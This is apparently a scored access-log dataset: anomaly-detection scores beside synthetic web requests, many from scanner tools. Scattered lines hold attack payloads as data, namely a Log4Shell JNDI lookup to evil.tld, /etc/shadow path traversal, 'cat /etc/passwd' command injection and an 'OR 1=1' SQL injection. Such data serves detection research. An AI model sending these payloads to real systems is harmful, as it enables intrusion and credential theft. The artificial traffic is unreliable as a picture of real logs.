score_content,score_session,score_fused,score_fused_norm,line
95.17594909667969,,95.17594909667969,95.17594909667969,152.196.58.5 - - [10/Jan/2025:12:46:12 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 11490 "https://twitter.com/" "python-requests/2.31.0"
26.510583877563477,,26.510583877563477,26.510583877563477,253.217.17.118 - - [10/Jan/2025:12:46:13 +0000] "POST /search?q=laptop HTTP/1.1" 200 17609 "https://www.google.com/" "dirb/2.22"
104.85186004638672,,104.85186004638672,104.85186004638672,242.91.139.111 - - [10/Jan/2025:12:46:16 +0000] "TRACE /dashboard HTTP/1.1" 200 10811 "https://example.com/" "python-requests/2.31.0"
49.41131591796875,,49.41131591796875,49.41131591796875,114.203.229.45 - - [10/Jan/2025:12:46:19 +0000] "DELETE /search?q=router HTTP/1.1" 200 11037 "https://example.com/" "nikto/2.5.0"
0.2610248327255249,,0.2610248327255249,0.2610248327255249,254.149.197.235 - - [10/Jan/2025:12:46:19 +0000] "GET /assets/app.css HTTP/1.1" 200 18992 "-" "dirb/2.22"
23.581018447875977,,23.581018447875977,23.581018447875977,146.47.142.45 - - [10/Jan/2025:12:46:22 +0000] "GET /search?q=phone HTTP/1.1" 200 5435 "https://www.google.com/" "dirb/2.22"
2.2305479049682617,,2.2305479049682617,2.2305479049682617,109.76.54.131 - - [10/Jan/2025:12:46:22 +0000] "GET / HTTP/1.1" 200 17153 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.41287612915039,,49.41287612915039,49.41287612915039,137.189.190.25 - - [10/Jan/2025:12:46:24 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 16978 "-" "Wget/1.21.2 (linux-gnu)"
3.283682346343994,,3.283682346343994,3.283682346343994,227.114.50.93 - - [10/Jan/2025:12:46:27 +0000] "GET /.git/config HTTP/1.1" 304 10523 "-" "python-requests/2.31.0"
30205.6328125,,30205.6328125,30205.6328125,93.7.139.55 - - [10/Jan/2025:12:46:29 +0000] "OPTIONS /search?q=phone HTTP/1.1" 400 724 "https://example.com/" "python-requests/2.31.0"
4.7979865074157715,,4.7979865074157715,4.7979865074157715,236.222.180.209 - - [10/Jan/2025:12:46:30 +0000] "POST /contact HTTP/1.1" 200 4582 "https://www.google.com/" "python-requests/2.31.0"
104.9209976196289,,104.9209976196289,104.9209976196289,161.162.30.171 - - [10/Jan/2025:12:46:32 +0000] "TRACE /contact HTTP/1.1" 200 11984 "https://twitter.com/" "dirb/2.22"
76.43566131591797,,76.43566131591797,76.43566131591797,192.4.210.195 - - [10/Jan/2025:12:46:35 +0000] "OPTIONS /contact HTTP/1.1" 302 10589 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
105.0096435546875,,105.0096435546875,105.0096435546875,92.213.10.5 - - [10/Jan/2025:12:46:36 +0000] "TRACE /admin HTTP/1.1" 200 16929 "https://twitter.com/" "nikto/2.5.0"
30134.294921875,,30134.294921875,30134.294921875,98.79.44.173 - - [10/Jan/2025:12:46:39 +0000] "GET /search?q=phone HTTP/1.1" 401 457 "https://www.google.com/" "curl/7.85.0"
95.1950454711914,,95.1950454711914,95.1950454711914,24.7.136.122 - - [10/Jan/2025:12:46:42 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 201 17399 "https://twitter.com/" "nikto/2.5.0"
69.60189056396484,,69.60189056396484,69.60189056396484,212.166.125.98 - - [10/Jan/2025:12:46:43 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 19509 "https://twitter.com/" "curl/7.85.0"
26.333829879760742,,26.333829879760742,26.333829879760742,199.8.6.111 - - [10/Jan/2025:12:46:46 +0000] "DELETE /.env HTTP/1.1" 200 4647 "-" "dirb/2.22"
1.930079698562622,,1.930079698562622,1.930079698562622,186.92.160.215 - - [10/Jan/2025:12:46:46 +0000] "GET /profile HTTP/1.1" 200 11716 "https://twitter.com/" "curl/7.85.0"
27.524324417114258,,27.524324417114258,27.524324417114258,82.239.114.51 - - [10/Jan/2025:12:46:48 +0000] "DELETE /server-status HTTP/1.1" 200 2689 "https://example.com/" "nikto/2.5.0"
26.49555015563965,,26.49555015563965,26.49555015563965,184.179.34.250 - - [10/Jan/2025:12:46:49 +0000] "POST /search?q=laptop HTTP/1.1" 200 13180 "https://example.com/" "dirb/2.22"
107.93177032470703,,107.93177032470703,107.93177032470703,9.177.199.234 - - [10/Jan/2025:12:46:51 +0000] "TRACE /profile HTTP/1.1" 304 16204 "-" "nikto/2.5.0"
47.8049201965332,,47.8049201965332,47.8049201965332,243.134.48.149 - - [10/Jan/2025:12:46:51 +0000] "HEAD /logout HTTP/1.1" 200 183 "-" "sqlmap/1.7.2#stable"
30137.98046875,,30137.98046875,30137.98046875,230.185.121.108 - - [10/Jan/2025:12:46:53 +0000] "DELETE /login HTTP/1.1" 403 789 "https://www.google.com/" "python-requests/2.31.0"
7.867302417755127,,7.867302417755127,7.867302417755127,64.33.114.100 - - [10/Jan/2025:12:46:54 +0000] "POST /logout HTTP/1.1" 304 17659 "https://news.ycombinator.com/" "nikto/2.5.0"
13.461661338806152,,13.461661338806152,13.461661338806152,1.141.145.202 - - [10/Jan/2025:12:46:54 +0000] "PUT /about HTTP/1.1" 200 3243 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8893204927444458,,1.8893204927444458,1.8893204927444458,180.220.53.223 - - [10/Jan/2025:12:46:54 +0000] "GET /dashboard HTTP/1.1" 201 19404 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.53082275390625,,50.53082275390625,50.53082275390625,67.87.31.241 - - [10/Jan/2025:12:46:55 +0000] "HEAD /server-status HTTP/1.1" 302 10053 "https://twitter.com/" "curl/7.85.0"
13.476189613342285,,13.476189613342285,13.476189613342285,28.156.163.222 - - [10/Jan/2025:12:46:55 +0000] "PUT /about HTTP/1.1" 200 5959 "https://twitter.com/" "python-requests/2.31.0"
2.22296142578125,,2.22296142578125,2.22296142578125,110.142.66.242 - - [10/Jan/2025:12:46:58 +0000] "GET / HTTP/1.1" 201 15374 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
126.52954864501953,,126.52954864501953,126.52954864501953,103.224.93.213 - - [10/Jan/2025:12:47:01 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 9635 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.368118286132812,,13.368118286132812,13.368118286132812,157.63.164.168 - - [10/Jan/2025:12:47:04 +0000] "PUT /api/products HTTP/1.1" 200 17036 "-" "nikto/2.5.0"
47.750064849853516,,47.750064849853516,47.750064849853516,18.247.206.126 - - [10/Jan/2025:12:47:06 +0000] "HEAD /contact HTTP/1.1" 200 9116 "https://www.google.com/" "dirb/2.22"
69.40137481689453,,69.40137481689453,69.40137481689453,81.83.147.3 - - [10/Jan/2025:12:47:09 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 4642 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.25520989298820496,,0.25520989298820496,0.25520989298820496,240.80.36.70 - - [10/Jan/2025:12:47:11 +0000] "GET /assets/app.css HTTP/1.1" 200 17113 "https://example.com/" "python-requests/2.31.0"
23.571044921875,,23.571044921875,23.571044921875,104.99.130.43 - - [10/Jan/2025:12:47:11 +0000] "GET /search?q=phone HTTP/1.1" 200 3521 "https://news.ycombinator.com/" "curl/7.85.0"
23.602354049682617,,23.602354049682617,23.602354049682617,31.172.133.182 - - [10/Jan/2025:12:47:12 +0000] "GET /search?q=phone HTTP/1.1" 200 9986 "https://twitter.com/" "dirb/2.22"
52.36854553222656,,52.36854553222656,52.36854553222656,9.58.125.119 - - [10/Jan/2025:12:47:12 +0000] "DELETE /api/product?id=123 HTTP/1.1" 301 12587 "https://example.com/" "nikto/2.5.0"
47.7578125,,47.7578125,47.7578125,193.177.83.231 - - [10/Jan/2025:12:47:14 +0000] "HEAD /logout HTTP/1.1" 200 3641 "https://www.google.com/" "dirb/2.22"
5.171671390533447,,5.171671390533447,5.171671390533447,148.229.21.217 - - [10/Jan/2025:12:47:17 +0000] "GET / HTTP/1.1" 302 18026 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.503353118896484,,49.503353118896484,49.503353118896484,243.8.124.25 - - [10/Jan/2025:12:47:18 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 17453 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.55026245117188,,126.55026245117188,126.55026245117188,230.31.216.55 - - [10/Jan/2025:12:47:18 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 15068 "https://news.ycombinator.com/" "python-requests/2.31.0"
72.42861938476562,,72.42861938476562,72.42861938476562,200.184.244.189 - - [10/Jan/2025:12:47:19 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 301 16207 "https://news.ycombinator.com/" "python-requests/2.31.0"
30180.044921875,,30180.044921875,30180.044921875,6.198.247.15 - - [10/Jan/2025:12:47:19 +0000] "HEAD /search?q=headphones HTTP/1.1" 404 669 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.24127474427223206,,0.24127474427223206,0.24127474427223206,214.10.47.122 - - [10/Jan/2025:12:47:20 +0000] "GET /assets/app.css HTTP/1.1" 200 13054 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.04287338256836,,35.04287338256836,35.04287338256836,218.49.190.206 - - [10/Jan/2025:12:47:23 +0000] "PUT /search?q=headphones HTTP/1.1" 200 14827 "-" "nikto/2.5.0"
69.43228149414062,,69.43228149414062,69.43228149414062,137.198.34.234 - - [10/Jan/2025:12:47:23 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 8218 "-" "python-requests/2.31.0"
5.1518073081970215,,5.1518073081970215,5.1518073081970215,177.14.77.254 - - [10/Jan/2025:12:47:25 +0000] "GET / HTTP/1.1" 301 18059 "https://twitter.com/" "curl/7.85.0"
7.768232822418213,,7.768232822418213,7.768232822418213,142.157.240.137 - - [10/Jan/2025:12:47:28 +0000] "POST /contact HTTP/1.1" 304 2543 "https://news.ycombinator.com/" "curl/7.85.0"
73.44312286376953,,73.44312286376953,73.44312286376953,205.161.136.118 - - [10/Jan/2025:12:47:31 +0000] "OPTIONS /contact HTTP/1.1" 200 2471 "https://example.com/" "python-requests/2.31.0"
129.54010009765625,,129.54010009765625,129.54010009765625,86.231.170.40 - - [10/Jan/2025:12:47:32 +0000] "TRACE /search?q=router HTTP/1.1" 301 10445 "https://twitter.com/" "curl/7.85.0"
13.461234092712402,,13.461234092712402,13.461234092712402,248.242.23.39 - - [10/Jan/2025:12:47:32 +0000] "PUT /login HTTP/1.1" 200 3160 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30110.86328125,,30110.86328125,30110.86328125,177.54.111.144 - - [10/Jan/2025:12:47:33 +0000] "GET /assets/app.css HTTP/1.1" 404 1064 "https://www.google.com/" "sqlmap/1.7.2#stable"
69.49459838867188,,69.49459838867188,69.49459838867188,201.179.219.76 - - [10/Jan/2025:12:47:34 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 9680 "-" "dirb/2.22"
27.823606491088867,,27.823606491088867,27.823606491088867,3.41.162.249 - - [10/Jan/2025:12:47:36 +0000] "DELETE /login HTTP/1.1" 200 14710 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.017677307128906,,35.017677307128906,35.017677307128906,225.176.64.1 - - [10/Jan/2025:12:47:38 +0000] "PUT /search?q=headphones HTTP/1.1" 200 8439 "https://twitter.com/" "python-requests/2.31.0"
0.2767584025859833,,0.2767584025859833,0.2767584025859833,158.121.192.194 - - [10/Jan/2025:12:47:38 +0000] "GET /assets/app.js HTTP/1.1" 200 16556 "-" "Wget/1.21.2 (linux-gnu)"
30115.119140625,,30115.119140625,30115.119140625,65.25.74.234 - - [10/Jan/2025:12:47:40 +0000] "POST /about HTTP/1.1" 401 159 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.865931987762451,,7.865931987762451,7.865931987762451,250.111.147.151 - - [10/Jan/2025:12:47:42 +0000] "POST /login HTTP/1.1" 304 7699 "https://example.com/" "curl/7.85.0"
0.32419225573539734,,0.32419225573539734,0.32419225573539734,141.179.152.151 - - [10/Jan/2025:12:47:43 +0000] "GET /.git/config HTTP/1.1" 200 15264 "https://www.google.com/" "curl/7.85.0"
13.503710746765137,,13.503710746765137,13.503710746765137,251.38.67.168 - - [10/Jan/2025:12:47:44 +0000] "PUT /about HTTP/1.1" 200 12044 "https://twitter.com/" "sqlmap/1.7.2#stable"
1.8970699310302734,,1.8970699310302734,1.8970699310302734,10.50.77.92 - - [10/Jan/2025:12:47:44 +0000] "GET /contact HTTP/1.1" 200 4589 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.9705810546875,,104.9705810546875,104.9705810546875,199.200.225.220 - - [10/Jan/2025:12:47:47 +0000] "TRACE /logout HTTP/1.1" 200 16128 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.01892852783203,,35.01892852783203,35.01892852783203,158.254.136.254 - - [10/Jan/2025:12:47:48 +0000] "PUT /search?q=headphones HTTP/1.1" 200 8718 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30183.560546875,,30183.560546875,30183.560546875,97.156.242.230 - - [10/Jan/2025:12:47:49 +0000] "OPTIONS /logout HTTP/1.1" 401 498 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.2534951865673065,,0.2534951865673065,0.2534951865673065,57.7.65.16 - - [10/Jan/2025:12:47:49 +0000] "GET /assets/app.js HTTP/1.1" 200 10223 "https://twitter.com/" "nikto/2.5.0"
104.96015167236328,,104.96015167236328,104.96015167236328,154.134.187.150 - - [10/Jan/2025:12:47:50 +0000] "TRACE /login HTTP/1.1" 200 4955 "https://www.google.com/" "sqlmap/1.7.2#stable"
7.8462419509887695,,7.8462419509887695,7.8462419509887695,188.86.156.118 - - [10/Jan/2025:12:47:53 +0000] "POST /about HTTP/1.1" 302 207 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.522111892700195,,23.522111892700195,23.522111892700195,178.118.2.194 - - [10/Jan/2025:12:47:53 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7600 "https://news.ycombinator.com/" "dirb/2.22"
26.544588088989258,,26.544588088989258,26.544588088989258,185.231.124.211 - - [10/Jan/2025:12:47:54 +0000] "GET /search?q=camera HTTP/1.1" 304 4820 "https://example.com/" "curl/7.85.0"
105.00973510742188,,105.00973510742188,105.00973510742188,208.101.114.29 - - [10/Jan/2025:12:47:54 +0000] "TRACE /admin HTTP/1.1" 200 16958 "https://www.google.com/" "curl/7.85.0"
73.41277313232422,,73.41277313232422,73.41277313232422,197.179.79.39 - - [10/Jan/2025:12:47:56 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9465 "https://twitter.com/" "nikto/2.5.0"
35.12727737426758,,35.12727737426758,35.12727737426758,233.132.228.38 - - [10/Jan/2025:12:47:59 +0000] "PUT /search?q=laptop HTTP/1.1" 200 19542 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.24032975733280182,,0.24032975733280182,0.24032975733280182,174.250.216.228 - - [10/Jan/2025:12:48:02 +0000] "GET /assets/app.css HTTP/1.1" 201 13273 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.02610778808594,,35.02610778808594,35.02610778808594,111.74.146.121 - - [10/Jan/2025:12:48:04 +0000] "PUT /search?q=headphones HTTP/1.1" 200 10388 "-" "curl/7.85.0"
47.71977615356445,,47.71977615356445,47.71977615356445,200.142.11.62 - - [10/Jan/2025:12:48:07 +0000] "HEAD /contact HTTP/1.1" 200 3006 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.26002880930900574,,0.26002880930900574,0.26002880930900574,27.220.236.98 - - [10/Jan/2025:12:48:09 +0000] "GET /assets/app.css HTTP/1.1" 200 18662 "https://twitter.com/" "python-requests/2.31.0"
49.45419692993164,,49.45419692993164,49.45419692993164,183.246.69.103 - - [10/Jan/2025:12:48:09 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 5295 "https://example.com/" "curl/7.85.0"
129.57891845703125,,129.57891845703125,129.57891845703125,245.209.232.87 - - [10/Jan/2025:12:48:12 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 16839 "-" "sqlmap/1.7.2#stable"
49.45895004272461,,49.45895004272461,49.45895004272461,244.21.1.165 - - [10/Jan/2025:12:48:12 +0000] "DELETE /search?q=phone HTTP/1.1" 200 18566 "https://news.ycombinator.com/" "nikto/2.5.0"
104.9165267944336,,104.9165267944336,104.9165267944336,15.135.41.215 - - [10/Jan/2025:12:48:15 +0000] "TRACE /profile HTTP/1.1" 200 10862 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
1.805136799812317,,1.805136799812317,1.805136799812317,2.92.215.38 - - [10/Jan/2025:12:48:16 +0000] "GET /api/products HTTP/1.1" 200 2777 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.2474594116211,,95.2474594116211,95.2474594116211,48.27.51.222 - - [10/Jan/2025:12:48:18 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 15520 "https://example.com/" "python-requests/2.31.0"
0.2377161979675293,,0.2377161979675293,0.2377161979675293,164.214.234.22 - - [10/Jan/2025:12:48:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12111 "https://www.google.com/" "nikto/2.5.0"
12.0132474899292,,12.0132474899292,12.0132474899292,104.133.59.50 - - [10/Jan/2025:12:48:19 +0000] "PUT /.env HTTP/1.1" 200 966 "https://news.ycombinator.com/" "curl/7.85.0"
13.281570434570312,,13.281570434570312,13.281570434570312,9.78.9.250 - - [10/Jan/2025:12:48:21 +0000] "PUT /server-status HTTP/1.1" 200 18851 "https://twitter.com/" "sqlmap/1.7.2#stable"
126.61044311523438,,126.61044311523438,126.61044311523438,47.47.232.186 - - [10/Jan/2025:12:48:23 +0000] "TRACE /api/product?id=123 HTTP/1.1" 201 10281 "https://www.google.com/" "curl/7.85.0"
0.2140914797782898,,0.2140914797782898,0.2140914797782898,253.188.91.32 - - [10/Jan/2025:12:48:23 +0000] "GET /assets/app.css HTTP/1.1" 200 6677 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30123.67578125,,30123.67578125,30123.67578125,75.16.128.66 - - [10/Jan/2025:12:48:25 +0000] "PUT /logout HTTP/1.1" 403 718 "https://example.com/" "dirb/2.22"
95.058349609375,,95.058349609375,95.058349609375,86.12.144.162 - - [10/Jan/2025:12:48:26 +0000] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 14855 "-" "sqlmap/1.7.2#stable"
27.556428909301758,,27.556428909301758,27.556428909301758,5.124.58.219 - - [10/Jan/2025:12:48:26 +0000] "DELETE /server-status HTTP/1.1" 200 9218 "-" "python-requests/2.31.0"
35.040374755859375,,35.040374755859375,35.040374755859375,26.252.148.136 - - [10/Jan/2025:12:48:29 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9033 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.40028381347656,,73.40028381347656,73.40028381347656,143.185.148.93 - - [10/Jan/2025:12:48:29 +0000] "OPTIONS /api/products HTTP/1.1" 200 10524 "https://www.google.com/" "curl/7.85.0"
49.45648193359375,,49.45648193359375,49.45648193359375,93.11.169.176 - - [10/Jan/2025:12:48:32 +0000] "DELETE /search?q=phone HTTP/1.1" 200 17764 "-" "dirb/2.22"
49.074283599853516,,49.074283599853516,49.074283599853516,222.162.30.3 - - [10/Jan/2025:12:48:35 +0000] "HEAD /wp-login.php HTTP/1.1" 304 2356 "https://twitter.com/" "nikto/2.5.0"
0.22449727356433868,,0.22449727356433868,0.22449727356433868,249.36.174.253 - - [10/Jan/2025:12:48:36 +0000] "GET /assets/app.js HTTP/1.1" 200 637 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
38.0340576171875,,38.0340576171875,38.0340576171875,211.31.183.16 - - [10/Jan/2025:12:48:39 +0000] "PUT /search?q=headphones HTTP/1.1" 304 14295 "-" "dirb/2.22"
69.44973754882812,,69.44973754882812,69.44973754882812,112.125.36.103 - - [10/Jan/2025:12:48:40 +0000] "HEAD /search?q=camera HTTP/1.1" 200 16145 "https://news.ycombinator.com/" "dirb/2.22"
23.53459930419922,,23.53459930419922,23.53459930419922,184.107.200.250 - - [10/Jan/2025:12:48:43 +0000] "GET /search?q=monitor HTTP/1.1" 200 4464 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
11047.1240234375,,11047.1240234375,11047.1240234375,232.221.107.82 - - [10/Jan/2025:12:48:44 +0000] "POST /about HTTP/1.1" 500 242 "https://twitter.com/" "nikto/2.5.0"
46.02519607543945,,46.02519607543945,46.02519607543945,41.180.107.34 - - [10/Jan/2025:12:48:44 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 8387 "https://www.google.com/" "nikto/2.5.0"
16.335527420043945,,16.335527420043945,16.335527420043945,138.97.106.91 - - [10/Jan/2025:12:48:47 +0000] "PUT /profile HTTP/1.1" 302 847 "https://example.com/" "dirb/2.22"
30183.69921875,,30183.69921875,30183.69921875,35.103.8.89 - - [10/Jan/2025:12:48:47 +0000] "OPTIONS /about HTTP/1.1" 404 950 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0220067501068115,,2.0220067501068115,2.0220067501068115,86.200.62.39 - - [10/Jan/2025:12:48:47 +0000] "GET /admin HTTP/1.1" 200 17384 "https://twitter.com/" "nikto/2.5.0"
16.206571578979492,,16.206571578979492,16.206571578979492,77.192.140.170 - - [10/Jan/2025:12:48:48 +0000] "PUT /server-status HTTP/1.1" 304 3933 "-" "python-requests/2.31.0"
46.100406646728516,,46.100406646728516,46.100406646728516,219.18.65.89 - - [10/Jan/2025:12:48:49 +0000] "HEAD /wp-login.php HTTP/1.1" 200 5569 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
69.4040298461914,,69.4040298461914,69.4040298461914,101.149.20.120 - - [10/Jan/2025:12:48:52 +0000] "HEAD /search?q=router HTTP/1.1" 200 5153 "https://www.google.com/" "python-requests/2.31.0"
